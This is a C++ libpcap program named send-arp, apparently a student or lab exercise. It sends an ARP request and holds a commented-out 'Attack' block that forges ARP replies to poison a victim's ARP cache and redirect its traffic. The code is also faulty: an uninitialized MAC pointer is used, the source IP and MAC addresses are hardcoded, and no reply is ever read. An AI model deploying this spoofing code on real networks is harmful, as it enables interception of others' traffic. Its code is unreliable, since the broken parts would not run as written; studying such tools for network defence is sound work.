#include <cstdio>
#include <pcap.h>
#include <fstream>
#include <iostream>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp eth0 192.168.0.2 192.168.0.1\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char* senderIP = argv[2];
	char* targetIP = argv[3];
	char* myMAC;

	EthArpPacket packet;

	// Get Sender Mac
	packet.eth_.dmac_ = Mac(Mac::broadcastMac());
	packet.eth_.smac_ = Mac(myMAC);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(myMAC);
	packet.arp_.sip_ = htonl(Ip("192.168.0.10"));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(senderIP));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));



	// Attack
	// packet.eth_.dmac_ = Mac("38:F9:D3:99:F3:7D");
	// packet.eth_.smac_ = Mac("00:0C:29:B7:F7:68");
	// packet.eth_.type_ = htons(EthHdr::Arp);

	// packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	// packet.arp_.pro_ = htons(EthHdr::Ip4);
	// packet.arp_.hln_ = Mac::SIZE;
	// packet.arp_.pln_ = Ip::SIZE;
	// packet.arp_.op_ = htons(ArpHdr::Reply);
	// packet.arp_.smac_ = Mac("00:0C:29:B7:F7:68");
	// packet.arp_.sip_ = htonl(Ip(targetIP));
	// packet.arp_.tmac_ = Mac("38:F9:D3:99:F3:7D");
	// packet.arp_.tip_ = htonl(Ip(senderIP));

	// res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	// if (res != 0) {
	// 	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	// }

	pcap_close(handle);
}
